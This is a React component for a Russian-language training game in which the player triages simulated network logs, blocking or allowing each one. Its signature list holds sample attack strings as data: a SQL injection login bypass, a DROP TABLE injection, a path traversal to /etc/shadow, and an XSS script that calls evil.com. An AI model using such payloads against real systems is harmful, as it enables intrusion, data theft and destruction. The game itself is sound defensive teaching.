import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Shield, Search, AlertCircle, Check, Terminal, Activity, Skull, Database } from 'lucide-react';

const THREAT_SIGNATURES = [
    { type: 'SQLi', payload: "POST /login?u=admin&p=' OR '1'='1" },
    { type: 'XSS', payload: "GET /q=<script>fetch('http://evil.com/leak')</script>" },
    { type: 'BruteForce', payload: "AUTH_FAIL: admin (Attempt 432/5000)" },
    { type: 'PathTraversal', payload: "GET /v1/download?file=../../../../etc/shadow" },
    { type: 'SQLi', payload: "SELECT * FROM users WHERE id=1; DROP TABLE users;" }
];

const FirewallMission = ({ username, currentPoints, onComplete }) => {
    const [logs, setLogs] = useState([]);
    const [selectedLog, setSelectedLog] = useState(null);
    const [feedback, setFeedback] = useState(null);
    const [health, setHealth] = useState(100);
    const [xp, setXp] = useState(0);
    const [isFinished, setIsFinished] = useState(false);
    const [showIntro, setShowIntro] = useState(true);

    const KNOWLEDGE_BASE = {
        SQLi: { title: "SQL Инъекция", explanation: "Попытка обхода базы данных. Использование 'OR' позволяет зайти без пароля. КРИТИЧНО.", safe: false },
        XSS: { title: "Cross-Site Scripting", explanation: "Внедрение JS-кода. Позволяет украсть куки и сессии. КРИТИЧНО.", safe: false },
        BruteForce: { title: "Brute Force", explanation: "Множественные попытки авторизации. Бот подбирает пароль. БЛОКИРОВАТЬ.", safe: false },
        PathTraversal: { title: "Path Traversal", explanation: "Попытка доступа к системным файлам сервера (../../etc/passwd). ОПАСНО.", safe: false },
        CLEAN: { title: "Чистый трафик", explanation: "Стандартный системный запрос. Блокировка вызовет отказ в обслуживании (DoS) для клиента.", safe: true }
    };

    // Логика игры
    useEffect(() => {
        if (health <= 0 || isFinished || feedback || showIntro) return;

        const interval = setInterval(() => {
            // Теперь вероятность угрозы случайна, нет строгого чередования
            const isThreat = Math.random() > 0.6; 
            const signature = isThreat ? THREAT_SIGNATURES[Math.floor(Math.random() * THREAT_SIGNATURES.length)] : null;
            
            const newLog = {
                id: Date.now(),
                ip: isThreat ? `185.10.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}` : `172.16.0.${Math.floor(Math.random()*254)}`,
                port: signature ? [21, 22, 3306, 3389][Math.floor(Math.random()*4)] : [80, 443, 53][Math.floor(Math.random()*3)],
                payload: signature ? signature.payload : `GET /static/v${Math.floor(Math.random()*9)}/assets/index.js`,
                type: signature ? signature.type : "CLEAN",
                isThreat: isThreat,
                status: 'PENDING'
            };

            setLogs(prev => [newLog, ...prev].slice(0, 10));

            // Штраф за игнорирование
            if (isThreat) {
                setTimeout(() => {
                    setLogs(curr => {
                        const target = curr.find(l => l.id === newLog.id);
                        if (target && target.status === 'PENDING') {
                            setHealth(h => Math.max(0, h - 20));
                        }
                        return curr;
                    });
                }, 10000); 
            }
        }, 3000);

        return () => clearInterval(interval);
    }, [health, isFinished, feedback, showIntro]);

    const handleVerdict = (verdict) => {
        if (!selectedLog) return;
        const isCorrect = (verdict === 'BLOCK' && selectedLog.isThreat) || (verdict === 'ALLOW' && !selectedLog.isThreat);
        
        setFeedback({ isCorrect, ...KNOWLEDGE_BASE[selectedLog.type] });

        if (isCorrect) setXp(v => v + 300);
        else setHealth(h => Math.max(0, h - 25));

        setLogs(prev => prev.filter(l => l.id !== selectedLog.id));
        setSelectedLog(null);
    };

    const handleFinalFinish = () => {
        const totalXP = xp + (health * 5);
        onComplete(currentPoints + totalXP);
        setIsFinished(true);
    };

    // 1. ЭКРАН ВВОДА
    if (showIntro) return (
        <div className="window animate-fade" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '100%', padding: '40px', textAlign: 'center' }}>
            <Activity size={60} color="#00ff41" style={{ marginBottom: '20px' }} />
            <h1 className="glitch-text" style={{ color: '#00ff41' }}>МОНИТОРИНГ ПЕРИМЕТРА</h1>
            <div style={{ maxWidth: '600px', color: '#e0e0e0', lineHeight: '1.8', fontSize: '18px', margin: '20px 0' }}>
                <p>Анализируйте входящий трафик на наличие вредоносных сигнатур.</p>
                <p>Блокируйте <b>SQLi, XSS, BruteForce</b> и попытки взлома файловой системы.</p>
                <p>Пропускайте только чистые системные запросы.</p>
            </div>
            <button className="btn-main" onClick={() => setShowIntro(false)}>ИНИЦИАЛИЗАЦИЯ</button>
        </div>
    );

    // 2. ЭКРАН ПОРАЖЕНИЯ (Health 0)
    if (health <= 0) return (
        <div className="window animate-fade" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '100%', border: '2px solid #ff4d4d' }}>
            <Skull size={80} color="#ff4d4d" />
            <h1 className="glitch-text" style={{ color: '#ff4d4d', fontSize: '40px' }}>SYSTEM CRASHED</h1>
            <p style={{ color: '#ff4d4d' }}>Периметр прорван. Базы данных скомпрометированы.</p>
            <button className="btn-huge" style={{ background: '#ff4d4d', color: '#000', marginTop: '20px' }} onClick={() => onComplete(currentPoints)}>ПЕРЕЗАГРУЗКА</button>
        </div>
    );

    // 3. ЭКРАН ПОБЕДЫ
    if (isFinished) return (
        <div className="window success-screen animate-fade" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '100%' }}>
            <Shield size={80} color="#00ff41" />
            <div className="glitch-text" style={{ fontSize: '40px', color: '#00ff41', margin: '20px 0' }}>ACCESS GRANTED</div>
            <h2>ПЕРИМЕТР ОЧИЩЕН</h2>
            <p>Заработано XP: {xp + (health * 5)}</p>
            <button className="btn-huge ready" style={{ marginTop: '20px' }} onClick={() => onComplete(currentPoints + xp + (health * 5))}>ВЕРНУТЬСЯ В ТЕРМИНАЛ</button>
        </div>
    );

    return (
        <div style={{ display: 'flex', flexDirection: 'column', height: '100%', width: '100%', padding: '10px' }}>
            
            <AnimatePresence>
                {feedback && (
                    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(0,0,0,0.9)', zIndex: 1000, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                        <div className="window" style={{ maxWidth: '600px', padding: '40px', border: `2px solid ${feedback.isCorrect ? '#00ff41' : '#ff4d4d'}` }}>
                            <h2 style={{ color: feedback.isCorrect ? '#00ff41' : '#ff4d4d', display: 'flex', alignItems: 'center', gap: '15px' }}>
                                {feedback.isCorrect ? <Check /> : <AlertCircle />} {feedback.title}
                            </h2>
                            <p style={{ color: '#ccc', margin: '20px 0', fontSize: '18px' }}>{feedback.explanation}</p>
                            <button className="btn-main" onClick={() => setFeedback(null)}>ДАЛЕЕ</button>
                        </div>
                    </motion.div>
                )}
            </AnimatePresence>

            <div style={{ display: 'grid', gridTemplateColumns: '1fr 450px', gap: '20px', flex: 1, minHeight: 0 }}>
                
                <div className="window" style={{ display: 'flex', flexDirection: 'column', minHeight: 0 }}>
                    <div className="panel-header" style={{ display: 'flex', justifyContent: 'space-between', padding: '15px' }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}><Terminal size={18} /> <span>IPS_MONITOR</span></div>
                        <div style={{ color: '#00ff41' }}>SCORE: {xp}</div>
                    </div>
                    
                    <div style={{ flex: 1, overflowY: 'auto', padding: '15px' }}>
                        <AnimatePresence>
                            {logs.map(log => (
                                <motion.div 
                                    key={log.id} layout initial={{ opacity: 0, x: -50 }} animate={{ opacity: 1, x: 0 }}
                                    onClick={() => setSelectedLog(log)}
                                    style={{
                                        display: 'grid', gridTemplateColumns: '130px 1fr 100px', gap: '15px',
                                        padding: '15px', marginBottom: '10px', background: '#0a0a0a', cursor: 'pointer',
                                        border: selectedLog?.id === log.id ? '1px solid #00ff41' : '1px solid #222'
                                    }}
                                >
                                    <span style={{ color: '#666', fontSize: '12px' }}>{log.ip}</span>
                                    <span style={{ color: '#444', overflow: 'hidden', whiteSpace: 'nowrap' }}>PORT: {log.port}</span>
                                    <span style={{ color: '#00ff41', textAlign: 'right', fontSize: '11px' }}>АНАЛИЗ</span>
                                </motion.div>
                            ))}
                        </AnimatePresence>
                    </div>

                    {xp >= 1500 && (
                        <div style={{ padding: '20px' }}>
                            <button className="btn-huge ready" onClick={handleFinalFinish}>ЗАВЕРШИТЬ МИССИЮ</button>
                        </div>
                    )}
                </div>

                <div className="window" style={{ display: 'flex', flexDirection: 'column' }}>
                    <div className="panel-header" style={{ padding: '15px' }}><Search size={16} /> ИНСПЕКТОР</div>
                    
                    <div style={{ flex: 1, padding: '25px', display: 'flex', flexDirection: 'column' }}>
                        {selectedLog ? (
                            <div className="animate-fade" style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
                                <div style={{ marginBottom: '20px' }}>
                                    <label style={{ color: '#444', fontSize: '12px' }}>SOURCE_IP</label>
                                    <div style={{ fontSize: '20px', color: '#eee' }}>{selectedLog.ip}</div>
                                </div>

                                <div style={{ marginBottom: '20px' }}>
                                    <label style={{ color: '#444', fontSize: '12px' }}>TARGET_PORT</label>
                                    <div style={{ fontSize: '20px', color: '#00ff41' }}>{selectedLog.port}</div>
                                </div>

                                <div style={{ flex: 1 }}>
                                    <label style={{ color: '#444', fontSize: '12px' }}>DATA_PAYLOAD</label>
                                    <div style={{ background: '#000', padding: '15px', border: '1px solid #333', marginTop: '5px', wordBreak: 'break-all', fontFamily: 'monospace', color: '#00ff41', fontSize: '14px' }}>
                                        {selectedLog.payload}
                                    </div>
                                </div>

                                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '15px', marginTop: '20px' }}>
                                    <button className="btn-action" onClick={() => handleVerdict('ALLOW')} style={{ color: '#4d94ff', borderColor: '#4d94ff' }}>ПРОПУСТИТЬ</button>
                                    <button className="btn-action" onClick={() => handleVerdict('BLOCK')} style={{ color: '#ff4d4d', borderColor: '#ff4d4d' }}>БЛОКИРОВАТЬ</button>
                                </div>
                            </div>
                        ) : (
                            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', opacity: 0.1 }}>
                                <Database size={60} />
                                <p>ОЖИДАНИЕ ПАКЕТА</p>
                            </div>
                        )}
                    </div>

                    <div style={{ padding: '20px', background: '#0a0a0a', borderTop: '1px solid #222' }}>
                        <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '10px', fontSize: '12px' }}>
                            <span>SYSTEM_HEALTH</span>
                            <span style={{ color: health < 40 ? '#ff4d4d' : '#00ff41' }}>{health}%</span>
                        </div>
                        <div style={{ height: '4px', background: '#222', borderRadius: '2px', overflow: 'hidden' }}>
                            <motion.div animate={{ width: `${health}%`, background: health < 40 ? '#ff4d4d' : '#00ff41' }} style={{ height: '100%' }} />
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default FirewallMission;